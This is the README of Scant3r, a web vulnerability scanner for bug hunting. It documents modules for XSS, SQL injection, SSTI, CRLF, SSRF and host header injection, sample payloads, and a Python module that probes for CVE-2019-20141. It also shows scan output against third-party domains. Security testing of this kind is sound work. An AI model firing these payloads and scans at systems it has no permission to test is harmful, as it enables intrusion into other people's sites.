# Scant3r - web application vulnerability scanner

**Why would you use Scant3r?**

Scant3r Scans all URLs with multiple HTTP Methods and Tries to look for bugs with basic exploits as **XSS - SQLI - RCE - CRLF -SSTI** from Headers and URL Parameters
By chaining [waybackurls](https://github.com/tomnomnom/waybackurls) or [gau](https://github.com/lc/gau) <br>
with Scant3r you will have more time to look into functions and get Easy bugs on the way :)

### What will Scant3r give you?

**Scant3r will give you more time to focus on functionalities We've provided some modules to help you**

| Module              | Description                   |
| :-------------    | :-------------                |
| **PMG** | dump a intersting **parameters** from [waybackurls](https://github.com/tomnomnom/waybackurls)|
| **lorsrf** | Bruteforcing on Hidden parameters to find SSRF vulnerability |
| **headers** | inject **SSTI - XSS - RCE - SQLI** payloads in HTTP Headers |
| **hostping** | get live domains|
| **hostinj** | Host Header injection |
| **paths** | dirbrute forcing|
| **reflect** | find reflected parameters|
| **neon** | scans admin panel from CVE-2019-20141 |

***

## Installation

### Linux ![Linux](http://icons.iconarchive.com/icons/dakirby309/simply-styled/32/OS-Linux-icon.png)

```bash
$ git clone https://github.com/knassar702/scant3r
$ cd scant3r
$ pip3 install -r requirements.txt
```

### Update to latest version:
```bash
$ cd scant3r
$ git pull
```
**Usage**
* normal scan
```bash
$ echo "http://testphp.vulnweb.com/search.php?test=query&searchFor=1&goButton=go" | python3 scant3r.py 
```
* ScanT3r API
```bash
$ python3 scant3r.py --api
```

### API Endpoints
* /scan/{scanid}
* parameter: `url`

| ID              | Scanner                   |
| :-------------    | :-------------                |
| **1** | XSS|
| **2** | SQLI |
| **3** | RCE |
| **4** | SSTI |
| **5** | CRLF|

#### Example:
* SSTI
```bash
[knassar702@PC]:~/tools/scant3r - curl http://127.0.0.1:6040/scan/4?url=http://localhost/search?u= -sk | jq
{
  "Bugs": [
    {
      "link": "http://localhost/search?u=%73%63%61%6e%7b%7b%36%2a%36%7d%7d%74%33%72",
      "method": "GET",
      "name": "template injection",
      "parameter": "u=",
      "payload": "scan{{6*6}}t3r",
      "target": "http://localhost/search"
    },
    {
      "data": "u=scan{{6*6}}t3r",
      "method": "POST",
      "name": "template injection",
      "parameter": "u=",
      "payload": "scan{{6*6}}t3r",
      "target": "http://localhost/search"
    }
  ]
}
```
* XSS
```bash
knassar702@PC]:~/tools/scant3r - curl "http://localhost:6040/scan/1?url=http://testphp.vulnweb.com/search.php?test=query%26searchFor=1%26goButton=go" -sk | jq
{
  "Bugs": [
    {
      "data": "test=query&searchFor=1\">ScanT3r<svg/onload=confirm(/ScanT3r/)>web\"&goButton=go",
      "method": "POST",
      "name": "Corss-site scripting",
      "parameter": "searchFor=1",
      "payload": "\">ScanT3r<svg/onload=confirm(/ScanT3r/)>web\"",
      "target": "http://testphp.vulnweb.com/search.php"
    }
  ]
}
```
### Docker ![DOCKER](https://img.icons8.com/color/48/000000/docker.png)
```bash
$ docker build -t scant3r https://github.com/knassar702/scant3r.git
$ docker run --rm -d -p 6040:6040 --name scant3r -it scant3r
```
***

* add module
```bash
$ echo "http://testphp.vulnweb.com/search.php?test=query&searchFor=1&goButton=go" | python3 scant3r.py -m headers
# note : use -S if you need to use scanner after use modules
```
* random User-agents
```bash
$ echo "http://testphp.vulnweb.com/search.php?test=query&searchFor=1&goButton=go" | python3 scant3r.py -R
```
* add custom headers
```bash
$ echo "http://testphp.vulnweb.com/search.php?test=query&searchFor=1&goButton=go" | python3 scant3r.py -H "Auth: U2NhblQzcgo=\nNew: True"
```
* add timeout
```bash
$ echo "http://testphp.vulnweb.com/search.php?test=query&searchFor=1&goButton=go" | python3 scant3r.py -t 1000
```
* add threads
```bash
$ echo "http://testphp.vulnweb.com/search.php?test=query&searchFor=1&goButton=go" | python3 scant3r.py -w 50
```
* add http/https proxy
```bash
$ echo "http://testphp.vulnweb.com/search.php?test=query&searchFor=1&goButton=go" | python3 scant3r.py -p http://localhost:8080
```
* add cookies
```bash
$ echo "http://testphp.vulnweb.com/search.php?test=query&searchFor=1&goButton=go" | python3 scant3r.py -c 'login=test%2Ftest'
```
* follow redirects
```bash
$ echo "http://testphp.vulnweb.com/search.php?test=query&searchFor=1&goButton=go" | python3 scant3r.py -r
```
* dump http requests/responses
```bash
$ echo "http://testphp.vulnweb.com/search.php?test=query&searchFor=1&goButton=go" | python3 scant3r.py -H "Auth: U2NhblQzcgo=" -d
```
![DUMP](images/req.png)

* remove logo
```bash
$ echo "http://testphp.vulnweb.com/search.php?test=query&searchFor=1&goButton=go" | python3 scant3r.py --nologo
```


## Modules 

* **PMG**
```bash
┌─[knassar702@PC]─[~/tools/scant3r]
└──╼ $cat waybackurls.txt | python3 scant3r.py -m PMG

+-+-+-+-+-+-+-+
|S|C|a|N|t|3|r|
+-+-+-+-+-+-+-+
             ____
            / . .\
            \  ---<
             \  /
   __________/ /
-=:___________/

[!] Coded by : Khaled Nassar @knassar702
[!] Version : 0.5#Beta
    	
[!] timeout : 10
[!] random-agent : False
[!] threads : 20
[!] module : PMG,
[!] URLS : 3
[!] host : None
http://example.com/?file=index.php
http://example.com/?api_key=
http://example.com/?api_key=
http://example.com/?search=
http://example.com/?search=

```
* **headers**
```bash
┌─[knassar702@PC]─[~/tools/scant3r]
└──╼ $echo https://menacoderrr.pythonanywhere.com|python3 scant3r.py -m headers

+-+-+-+-+-+-+-+
|S|C|a|N|t|3|r|
+-+-+-+-+-+-+-+
             ____
            / . .\
            \  ---<
             \  /
   __________/ /
-=:___________/

[!] Coded by : Khaled Nassar @knassar702
[!] Version : 0.5#Beta
    	
[!] timeout : 10
[!] random-agent : False
[!] threads : 20
[!] module : headers,
[!] URLS : 1
[!] host : None

[!] Bug : Cross-site scripting
[!] Header: User-agent
[!] Payload: ">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"
[!] Method: GET
[!] URL: https://menacoderrr.pythonanywhere.com
|-----------------|
        

[!] Bug : Cross-site scripting
[!] Header: referer
[!] Payload: ">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"
[!] Method: GET
[!] URL: https://menacoderrr.pythonanywhere.com
|-----------------|

```

* **lorsrf**

```bash
┌─[knassar702@PC]─[~/tools/scant3r]
└──╼ $echo 'http://yourtarget.com/' | python3 scant3r.py -m lorsrf -w 50 -R -x 'http://myhost.burpcollaborator.net'
+-+-+-+-+-+-+-+
|S|C|a|N|t|3|r|
+-+-+-+-+-+-+-+
             ____
            / . .\
            \  ---<
             \  /
   __________/ /
-=:___________/

[!] Coded by : Khaled Nassar @knassar702
[!] Version : 0.5#Beta
    	
[!] timeout : 10
[!] random-agent : False
[!] threads : 20
[!] module : lorsrf,
[!] URLS : 3
[!] host : None
```
<img src='images/call.png'>

* **paths**
```
┌─[knassar702@PC]─[~/tools/scant3r]
└──╼ $echo 'http://localhost/'| python3 scant3r.py -m paths -w 50


   ____              __  ____
  / __/______ ____  / /_|_  /____
 _\ \/ __/ _ `/ _ \/ __//_ </ __/
/___/\__/\_,_/_//_/\__/____/_/


[!] Coded by : Khaled Nassar @knassar702
[!] Version : 0.5#Beta
    	
[!] timeout : 10
[!] random-agent : False
[!] threads : 50
[!] module : paths,
[!] URLS : 1
[!] host : None

[+] Found :> http://loaclhost/phpinfo.php
[+] Found :> http://loaclhost/PI.php
```
* **hostping**
```
┌─[knassar702@PC]─[~/tools/scant3r]
└──╼ $cat ~/hunting/sony/domains.txt | python3 scant3r.py -m hostping


   ____              __  ____
  / __/______ ____  / /_|_  /____
 _\ \/ __/ _ `/ _ \/ __//_ </ __/
/___/\__/\_,_/_//_/\__/____/_/


[!] Coded by : Khaled Nassar @knassar702
[!] Version : 0.5#Beta
    	
[!] timeout : 10
[!] random-agent : False
[!] threads : 20
[!] module : hostping,
[!] URLS : 8588
[!] host : None
sony.com 54.144.253.202
intqa.sony.com 160.33.128.119
ns3.sony.com 160.33.66.20
rn.kb.sony.com 160.33.196.15
expressnetqa.sony.com 160.33.178.11
ns21.sony.com 160.33.195.4
eduqa.sony.com 160.33.128.117
br.en.kb.sony.com 160.33.196.15
ns1.sony.com 160.33.66.21
www.scea.sony.com 64.157.7.8
ca.en.kb.sony.com 160.33.196.15
la.en.kb.sony.com 160.33.196.15
la.es.kb.sony.com 160.33.196.15
us.en.kb.sony.com 160.33.196.15
```
* **CRLF**
```
┌─[knassar702@PC]─[~/tools/scant3r]
└──╼ $echo 'http://127.0.0.1:5000/?test=' | python3 scant3r.py -m crlf

+-+-+-+-+-+-+-+
|S|C|a|N|t|3|r|
+-+-+-+-+-+-+-+
             ____
            / . .\
            \  ---<
             \  /
   __________/ /
-=:___________/

[!] Coded by : Khaled Nassar @knassar702
[!] Version : 0.5#Beta
    	
[!] proxy : False
[!] timeout : 10
[!] random-agent : False
[!] threads : 20
[!] module : crlf,
[!] URLS : 1
[!] host : None
[CRLF] Found :> http://127.0.0.1:5000/?test=
[!] Method :> PUT
[!] Data :> test=%0AHeader-Test:BLATRUC

```
* **neon**
```bash
# CVE-2019-20141 - https://knassar702.github.io/cve/neon/
┌─[knassar702@PC]─[~/tools/scant3r]
└──╼ $echo http://$$$$$.com/admin/ | python3 scant3r.py -m neon


   ____              __  ____
  / __/______ ____  / /_|_  /____
 _\ \/ __/ _ `/ _ \/ __//_ </ __/
/___/\__/\_,_/_//_/\__/____/_/


[!] Coded by : Khaled Nassar @knassar702
[!] Version : 0.5#Beta
    	
[!] timeout : 10
[!] random-agent : False
[!] threads : 20
[!] module : neon,
[!] URLS : 1
[!] host : None

[!] Bug : Cross-site scripting
[!] Payload: <img src=x onerror=alert(1)>
[!] Method: GET
[!] parameter: q
[!] Link: q=<img src=x onerror=alert(1)>
|-----------------|

```

### Demo 

![Example](images/all.gif)

**Nokia** https://www.nokia.com/responsible-disclosure/
![Nokia](images/nokia.gif)

**IBM** https://hackerone.com/ibm

![IBM](images/ibm.png)



### writing your scant3r module

* main function

```python

def run(opts):
  #opts = all options
  print(opts)
# {'proxy': None, 'cookie': None, 'timeout': 10, 'Headers': {}, 'list': None, 'random-agent': False, 'threads': 20, 'module': None, 'url': [], 'host': None}
  
```

## all functions

| function              | Description                   |
| :-------------    | :-------------                |
| NewRequest | http request module with all user options (cookies/headers/etc..)|
| post_data | add modules value to dictionary (for cookies,post/put parameters)|
| urlencoder | url encoding|
| ShowMessage | print output of scanner/modules|
| extractHeaders | add headers value to dictionary|
| insertAfter | Insert some string into given string at given index 

* post_data
```python
>> from libs import post_data
>> post_data('id=1&user=admin')

{
   'id':'1',
  'user':'admin'
}
```

* NewRequest
```python
>> from libs import NewRequest as nq
>> from libs import post_data


# nq.Get(URL)
#-------------
# nq.Post(URL,PARAMETERS)
# nq.Put(URL,PARAMETERS)

>> nq.Get('http://testphp.vulnweb.com/search.php?test=query')
>> nq.Post('http://testphp.vulnweb.com/search.php',{'test':'query'})
>> nq.Put('http://testphp.vulnweb.com/search.php',{'test':'query'})

## you can use post_data function with Post and Put

nq.Post('http://testphp.vulnweb.com/search.php',post_data('test=query'))
nq.Put('http://testphp.vulnweb.com/search.php',post_data('test=query'))
```
* extractHeaders
```python
>> from libs import extractHeaders
>> extractHeaders('Auth: c2NhbnQzcgo=')
{'Auth': 'c2NhbnQzcgo='}
```
* urlencoder
```python
>> from libs import urlencoder
>> urlencoder('<img src=x onerror=alert(1)>')
%3c%69%6d%67%20%73%72%63%3d%78%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%31%29%3e
```
* insertAfter
```python
>> from libs import insertAfter
insertAfter('TEXT','INSERT_AFTER','NewText')

>> insertAfter('http://site.com/?msg=hi','=','" OR 1=1 --')
http://site.com/?msg=" OR 1=1 --hi
```
* ShowMessage
```python
>> from core import ShowMessage as show
>> show.bug(bug='Cross-site scripting',payload='<img src=x onerror=alert(1)>',method='GET',parameter='q',target='http://mysite.com',link='q=<img src=x onerror=alert(1)>')

```

# Examples :
*  **open urls**
```python
from libs import NewRequest as nq


def run(opts):
  for url in opts['url']:
      r = nq.Get(url)
      # 0 == error
      if r != 0:
        print(f'[+] Done :> {url}')
      
```
* **add threads**

```python
from libs import NewRequest as nq
from threading import Thread
from queue import Queue

q = Queue()
def openlink(url):
  r = nq.Get(url)
  if r != 0:
    print(f'[+] Done :> {url}')
def threader():
  while True:
    item = q.get()
    openlink(item)
    q.task_done()
def run(opts):
  for _ in range(opts['threads']):
    p1 = Thread(target=threader)
    p1.daemon = True
    p1.start()
  for url in opts['url']:
    q.put(url)
  q.join()
```
save it in `scant3r/modules/myscript.py`
run 
```
$ echo 'http://google.com'|python3 scant3r.py -m myscript
```

#### scan website from cve-2019-20141
```python
#!/usr/bin/env python3

from libs import NewRequest as nq
from libs import post_data
from core import ShowMessage as show
from core import info,bad
from threading import Thread
from queue import Queue
from urllib.parse import urlparse,urljoin

q = Queue()

def add_path(url):
    paths = [
            "data/sample-register-form.php",
            "data/sample-login-form.php",
            "data/autosuggest-remote.php",
            "data/sample-forgotpassword-form.php",
            "data/login-form.php"
            ]
    urls = []
    for path in paths:
        urls.append(urljoin(url,path))
    return urls
def threader():
    while True:
        item = q.get()
        NEON_CVE(item)
        q.task_done()
def run(opts):
    for i in range(opts['threads']):
        p1 = Thread(target=threader)
        p1.daemon = True
        p1.start()
    for url in opts['url']:
        q.put(url)
    q.join()
def NEON_CVE(url):
    urls = add_path(url)
    for u in urls:
        r = nq.Post(u,post_data('q=<img src=x onerror=alert(1)>'))
        if '<img src=x onerror=alert(1)>'.encode('utf-8') in r.content:
            show.bug(bug='Cross-site scripting',payload='<img src=x onerror=alert(1)>',method='GET',parameter='q',target=u,link='q=<img src=x onerror=alert(1)>')
  
```
#### Simple Module Template
```python3
#!/usr/bin/env python3
from threading import Thread
from queue import Queue

q = Queue()

def myfunc(host):
    print(host)
    
    
def threader():
    while True:
        item = q.get()
        myfunc(item)
        q.task_done()

def run(opts):
    for _ in range(opts['threads']):
        p1 = Thread(target=threader)
        p1.daemon = True
        p1.start()
    for url in opts['url']:
        q.put(url)
    q.join()
```
